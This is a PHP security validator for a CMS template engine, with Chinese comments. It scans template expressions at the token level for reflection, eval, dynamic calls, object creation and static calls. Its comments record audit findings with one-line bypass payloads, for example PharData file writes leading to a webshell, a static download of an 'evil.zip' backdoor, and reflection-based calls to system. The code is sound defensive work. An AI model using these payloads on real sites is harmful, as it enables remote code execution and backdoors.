<?php
namespace App\Service\System;

/**
 * L1 词法安全校验（基础设施任务 2）
 *
 * 基于 PHP 内建 token_get_all()（不依赖 ext-ast / PHP-Parser），与 TemplateService
 * 既有正则黑名单（assertSafeEditableCode）并行运行、互不替换：
 * - 正则层：词边界/调用形态/符号禁令/指令表达式深扫（既有五层，保持原样）
 * - 词法层（本类）：token 级识别——调用位置的危险函数名、Reflection* 反射类、
 *   变量函数 $fn()、变量方法 $o->$m()、变量变量 $$x/${...}、反引号、PHP 段残留、
 *   Closure::fromCallable 首类可调用向量
 *
 * 适用面：可编辑模板（template 主题目录下 html 文件，front 主题）保存路径。
 * 管理模板（core/admin/html/**，raw PHP）不在可编辑面，不经本校验。
 *
 * 误报基线（全语料实测）：template/ 与 core/admin/html/ 中
 * $$var / $fn( / Reflection 命中数 = 0 ⇒ 阻断集成安全。
 *
 * 上线前审计（第九轮）修复两处 RCE 门禁绕过：
 * - VULN-C01 `new <内置类>->方法()` 不受约束（原实现把 T_NEW 当 memberCall 跳过白名单，
 *   注释所称"构造调用有独立闸"并不存在）⇒ 现对 new / use 导入一律 fail-closed；
 * - VULN-C03 `\ReflectionFunction`（PHP8 = T_NAME_FULLY_QUALIFIED）漏判 ⇒ 现对名字 token
 *   统一按反斜杠归一取最后一段比对，且对任意位置生效。
 * 另补 I-01：`{@EXPR}` 指令纳入表达式提取（原提取正则只覆盖 `name:` 形态）。
 */
class LexicalSafetyService
{
    /** @var string[] 反射类族（词法层新增覆盖，正则黑名单未收录） */
    private static $reflectionClasses = array(
        'reflectionfunction', 'reflectionmethod', 'reflectionclass', 'reflectionobject',
        'reflectionproperty', 'reflectionenum', 'reflectionattribute', 'reflectionconstant',
        'reflectionparameter', 'reflectionextension', 'reflectiontype', 'reflectionnamedtype',
        'reflectionuniontype', 'reflectionintersectionsptype', 'reflectiongenerator',
        'reflectionreference', 'reflectionfiber', 'reflectionzendextension',
    );

    /**
     * 模板安全规则数据（core/config/template_guard.json）不可用时的统一结论：fail-closed，
     * 任何被扫描内容都视为不通过（不能因为黑名单为空而把一切放行）。
     * @return array[] findings
     */
    private static function guardMissingFindings(): array
    {
        return array(array('kind' => 'guard_missing', 'name' => 'core/' . TemplateService::GUARD_DATA_REL, 'expr' => ''));
    }

    /**
     * 扫描单条模板指令表达式（{if:}/{loop:}/{php:}/{vars:}/{@}/{...}/{$...} 内容——
     * 这些表达式会被编译器原样写入 PHP，是词法校验的主战场）
     * @return array[] findings: array('kind','name','expr')
     */
    public static function scanExpression(string $expr): array
    {
        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
        // 包裹为 PHP 片段以获得正确的 token 流（token_get_all 不要求语法合法）
        // 表达式走函数白名单（模板是可直接编译执行的攻击面）；整段源码扫描（主题钩子）不套白名单
        return self::scanTokens(@token_get_all('<?php ' . $expr . ';'), $expr, true);
    }

    /**
     * 扫描整段 PHP 源码（含 php 开标签）——与 scanExpression 同一 token 级判定，
     * 不提取模板指令；主题 install.php/uninstall.php 执行闸直接复用（fail-closed）。
     */
    public static function scanCode(string $code): array
    {
        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
        return self::scanTokens(@token_get_all($code), $code);
    }

    /**
     * 共享 token 级危险构造扫描（表达式与整段源码同口径）
     * @return array[] findings
     */
    private static function scanTokens(array $tokens, string $expr, bool $enforceAllowlist = false): array
    {
        $findings = array();
        $n = count($tokens);
        for ($i = 0; $i < $n; $i++) {
            $tok = $tokens[$i];
            if (!is_array($tok)) {
                // 单字符 token：反引号（shell 执行）/ 变量变量 $ / 动态可调用
                if ($tok === '`') {
                    $findings[] = array('kind' => 'backtick', 'name' => '`', 'expr' => $expr);
                }
                if ($tok === '$') {
                    $after = self::nextSignificant($tokens, $i + 1);
                    if ($after !== null && $after[0] === T_VARIABLE) {
                        $findings[] = array('kind' => 'var_var', 'name' => '$$' . $after[1], 'expr' => $expr);
                    }
                }
                // 动态可调用形态（括号包裹的字符串/拼接表达式、数组元素后直接跟调用括号）：
                // 调用括号前的有效 token 为 ) ] 变量 或字符串字面量。
                if ($tok === '(') {
                    $prev = self::prevSignificant($tokens, $i - 1);
                    if ($prev !== null && ($prev[1] === ')' || $prev[1] === ']' || $prev[0] === T_VARIABLE || $prev[0] === T_CONSTANT_ENCAPSED_STRING)) {
                        $findings[] = array('kind' => 'dynamic_call', 'name' => (string)$prev[1], 'expr' => $expr);
                    }
                }
                continue;
            }
            list($type, $text) = $tok;
            if ($type === T_WHITESPACE) continue;

            $next  = self::nextSignificant($tokens, $i + 1);
            $prev  = self::prevSignificant($tokens, $i - 1);
            $lower = strtolower($text);

            // 名字 token 归一：取最后一段（覆盖 PHP8 的 \Foo / Foo\Bar 与普通 T_STRING）
            $isName = ($type === T_STRING);
            if (!$isName && defined('T_NAME_FULLY_QUALIFIED') && $type === T_NAME_FULLY_QUALIFIED) $isName = true;
            if (!$isName && defined('T_NAME_QUALIFIED') && $type === T_NAME_QUALIFIED) $isName = true;
            $base = $lower;
            if ($isName) {
                $bs = strrpos($base, '\\');
                if ($bs !== false) $base = substr($base, $bs + 1);
            }

            // ---- (1) 反射类族（最具体，优先报出） --------------------------------
            // VULN-C03：`\ReflectionFunction` 在 PHP8 分词为 T_NAME_FULLY_QUALIFIED，
            // 原判定只认 T_STRING ⇒ `use \ReflectionFunction as RF; new RF($n); ->invoke()`
            // 整链绕过主题执行钩子闸。现按反斜杠归一取最后一段，对**任意位置**生效。
            // 先于下面的 new 闸判定：`new ReflectionFunction(...)` 应报「反射」而非泛化的
            // 「对象实例化」——反射是更精确、更可操作的安全语义（既有集成断言依赖此）。
            if ($isName && in_array($base, self::$reflectionClasses, true)) {
                $findings[] = array('kind' => 'reflection', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if ($isName && $base === 'closure' && $next !== null && $next[0] === T_DOUBLE_COLON) {
                $findings[] = array('kind' => 'first_class_callable', 'name' => $text . '::', 'expr' => $expr);
                continue;
            }

            // ---- (2) 对象实例化与导入：一律禁止 ---------------------------------
            // VULN-C01（上线前审计）：原实现把 T_NEW 当作 memberCall 跳过函数
            // 白名单，而注释所称的"构造调用独立闸"并不存在 ⇒
            //   {if:(new \PharData("/tmp/x.tar"))->addFromString("s.php", 一段原生 php 代码)}
            // 两层闸（legacyRegexFindings + scanTemplate）全过，可落地任意文件写入
            // （→ webshell）、内网 SSRF（new \SoapClient）、Redis/MySQL 命令（new \Redis）。
            // 模板语料零使用 ⇒ 直接禁止，零回归。确需对象由服务端预置变量传入。
            if ($type === T_NEW) {
                $findings[] = array('kind' => 'new_object', 'name' => 'new', 'expr' => $expr);
                continue;
            }
            // VULN-C03 配套：use 导入语句（`use (` 为闭包捕获语法，放行）
            if ($type === T_USE) {
                if (!($next !== null && $next[0] === '(')) {
                    $findings[] = array('kind' => 'use_import', 'name' => 'use', 'expr' => $expr);
                    continue;
                }
            }

            // ---- (3) 危险函数名以字符串字面量出现（回调名） ----------------------
            if ($type === T_CONSTANT_ENCAPSED_STRING) {
                $lit     = self::decodeStringLiteral($text);
                $litBase = strtolower($lit);
                $litBs   = strrpos($litBase, '\\');
                if ($litBs !== false) $litBase = substr($litBase, $litBs + 1);
                if ($litBase !== '' && in_array($litBase, \App\Service\System\TemplateService::safeEditableForbiddenFuncs(), true)) {
                    $findings[] = array('kind' => 'callback_string', 'name' => $lit, 'expr' => $expr);
                    continue;
                }
            }

            // ---- (3) eval / include 语句型 --------------------------------------
            if ($type === T_EVAL) {
                $findings[] = array('kind' => 'eval', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if (in_array($type, array(T_INCLUDE, T_INCLUDE_ONCE, T_REQUIRE, T_REQUIRE_ONCE), true)) {
                $findings[] = array('kind' => 'include', 'name' => $text, 'expr' => $expr);
                continue;
            }

            // ---- (4) 危险函数调用 / 模板表达式函数白名单 -------------------------
            if ($isName && $next !== null && $next[0] === '(') {
                if (in_array($base, \App\Service\System\TemplateService::safeEditableForbiddenFuncs(), true)) {
                    $findings[] = array('kind' => 'dangerous_call', 'name' => $text, 'expr' => $expr);
                    continue;
                }
                if ($base === 'fromcallable') {
                    $findings[] = array('kind' => 'first_class_callable', 'name' => $text, 'expr' => $expr);
                    continue;
                }
                if (in_array($base, self::$reflectionClasses, true)) {
                    $findings[] = array('kind' => 'reflection', 'name' => $text, 'expr' => $expr);
                    continue;
                }
                // 上线前终检修复（N-01，High）：原实现把「成员/静态调用」整体免检，理由写的是
                // 「对象实例化已在 (1) 全局禁止，故不存在用白名单外类的方法的旁路」——**该论证是错的**：
                // `Foo::bar()` 不需要 new，任何已加载类的静态方法都能被调用并传字符串参数。
                // 实测（修复前）：`{if:\App\Service\System\TemplateService::download("http://…/evil.zip","x")}`
                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容为一句话后门）
                // 写进 docroot（端到端落地）。
                // 模板表达式对静态/方法调用**零需求**（全仓 `{if:}`/`{@}` 内 `::` 与 `->` 实测用量 0），
                // 故一律拒绝，而不是"免检"。
                if ($enforceAllowlist) {
                    $callKind = '';
                    if ($prev !== null) {
                        $pt = $prev[0];
                        if ($pt === T_DOUBLE_COLON) $callKind = 'static_call';
                        elseif ($pt === T_OBJECT_OPERATOR) $callKind = 'method_call';
                        elseif (defined('T_NULLSAFE_OBJECT_OPERATOR') && $pt === T_NULLSAFE_OBJECT_OPERATOR) $callKind = 'method_call';
                    }
                    if ($callKind !== '') {
                        $findings[] = array('kind' => $callKind, 'name' => $text, 'expr' => $expr);
                        continue;
                    }
                    if (!in_array($base, \App\Service\System\TemplateService::safeTemplateCallAllowlist(), true)) {
                        $findings[] = array('kind' => 'unknown_call', 'name' => $text, 'expr' => $expr);
                        continue;
                    }
                }
            }

            // ---- (5) （反射类族 / Closure:: 已在 (1) 优先判定，此处不再重复） ------

            // ---- (6) 变量函数 / 变量方法 / 变量变量 -------------------------------
            if ($type === T_VARIABLE && $next !== null && $next[0] === '(') {
                $findings[] = array('kind' => 'var_func', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if ($type === T_OBJECT_OPERATOR && $next !== null && $next[0] === T_VARIABLE) {
                $after = self::nextSignificant($tokens, $i + 2);
                if ($after !== null && $after[0] === '(') {
                    $findings[] = array('kind' => 'var_method', 'name' => $text . $next[1], 'expr' => $expr);
                }
                continue;
            }
            if ($type === T_DOLLAR_OPEN_CURLY_BRACES) {
                $findings[] = array('kind' => 'var_var', 'name' => '${', 'expr' => $expr);
                continue;
            }
        }
        // 上线前审计：按「语义具体度」重排 findings，而非按源码 token 位置。
        // 动机：`{if:(new ReflectionFunction("system"))->invoke("x")}` 中 `new` 先于类名出现，
        // 位置序会把泛化的 new_object 排在具体的 reflection 之前，掩盖更可操作的安全语义
        // （排序须保证：能报出 reflection，而不是先报泛化的对象实例化）。
        // 拦截结论不变（findings 非空即拦），仅影响「首条文案」。稳定排序，同权重保持出现序。
        if (count($findings) > 1) {
            static $rank = array(
                'reflection' => 0, 'first_class_callable' => 0, 'backtick' => 0,
                'eval' => 1, 'include' => 1, 'dangerous_call' => 1, 'callback_string' => 1,
                'var_func' => 2, 'var_method' => 2, 'var_var' => 2, 'dynamic_call' => 2,
                'use_import' => 3, 'new_object' => 3, 'unknown_call' => 3,
                'php_tag' => 4,
            );
            $idx = 0;
            foreach ($findings as &$__f) { $__f['_i'] = $idx++; }
            unset($__f);
            usort($findings, function ($a, $b) use ($rank) {
                $ra = isset($rank[$a['kind']]) ? $rank[$a['kind']] : 9;
                $rb = isset($rank[$b['kind']]) ? $rank[$b['kind']] : 9;
                return $ra === $rb ? ($a['_i'] - $b['_i']) : ($ra - $rb);
            });
            foreach ($findings as &$__f) { unset($__f['_i']); }
            unset($__f);
        }
        return $findings;
    }

    /**
     * 扫描整个模板文件内容：
     * 1) 全文件 token 流——检测 PHP 段残留（front 模板由 <? 符号禁令拦截，此处为纵深冗余）
     * 2) 指令表达式提取（与 assertSafeEditableCode 同口径正则）→ 逐条 scanExpression
     * @return array[] findings
     */
    public static function scanTemplate(string $code): array
    {
        if (!TemplateService::guardAvailable()) return self::guardMissingFindings();
        $findings = array();
        $tokens = @token_get_all($code);
        $phpSeen = '';
        foreach ($tokens as $tok) {
            if (!is_array($tok)) continue;
            if ($tok[0] === T_OPEN_TAG || $tok[0] === T_OPEN_TAG_WITH_ECHO || $tok[0] === T_CLOSE_TAG) {
                $phpSeen .= $tok[1];
                continue;
            }
            if ($phpSeen !== '' && $tok[0] !== T_WHITESPACE) {
                // PHP 段内的实质 token（front 模板本不应存在）
                $findings[] = array('kind' => 'php_tag', 'name' => substr($tok[1], 0, 40), 'expr' => $phpSeen);
            }
        }
        if ($phpSeen !== '' && empty($findings)) {
            // PHP 段存在但仅空白——仍记录（纵深冗余，正则符号层已先行拦截）
            $findings[] = array('kind' => 'php_tag', 'name' => $phpSeen, 'expr' => $phpSeen);
        }

        // 指令表达式提取（与既有深扫同口径）
        $exprs = array();
        if (preg_match_all('#\{(?:if|elseif|loop|php|vars):(.*?)\}#is', $code, $mm)) {
            $exprs = array_merge($exprs, $mm[1]);
        }
        // 上线前审计修复（I-01）：`{@EXPR}` 单独提取——view.php 的 tpl_allow_expr 分支把它编译为
        // 一段 php echo 语句。原提取正则只覆盖 `name:` 形态，`{@...}` 完全不在扫描面内
        // （实测 `{@$f="sys"."tem"}{@$f("id")}`、反引号形态均全过）。线上 tpl_allow_expr=0
        // 时该指令被剥离，属纵深；一旦该开关经 KV 写入打开即为 RCE。
        // 与上面同一惰性语义：取到第一个 `}` 为止。
        if (preg_match_all('#\{@([^}]*)\}#s', $code, $mm3)) {
            $exprs = array_merge($exprs, $mm3[1]);
        }
        if (preg_match_all('#\{\$([^{}]*)\}#s', $code, $mm2)) {
            $exprs = array_merge($exprs, $mm2[1]);
        }
        foreach ($exprs as $expr) {
            foreach (self::scanExpression($expr) as $f) {
                $findings[] = $f;
            }
        }
        return $findings;
    }

    /** 解码 PHP 字符串字面量 token（单双引号）用于回调名比对 */
    private static function decodeStringLiteral(string $text): string
    {
        $len = strlen($text);
        if ($len < 2) return '';
        $quote = $text[0];
        $inner = substr($text, 1, -1);
        if ($quote === "'") {
            return str_replace(array('\\\\', "\\'"), array('\\', "'"), $inner);
        }
        return stripcslashes($inner);
    }

    /** 上一个有效 token（跳过空白与注释；null=无） */
    private static function prevSignificant(array $tokens, int $from): ?array
    {
        for ($i = $from; $i >= 0; $i--) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            return is_array($t) ? $t : array(0 => $t, 1 => (string)$t);
        }
        return null;
    }

    /** 下一个有效 token（跳过空白与注释；null=无） */
    private static function nextSignificant(array $tokens, int $from): ?array
    {
        $n = count($tokens);
        for ($i = $from; $i < $n; $i++) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            return is_array($t) ? $t : array(0 => $t, 1 => (string)$t);
        }
        return null;
    }
}
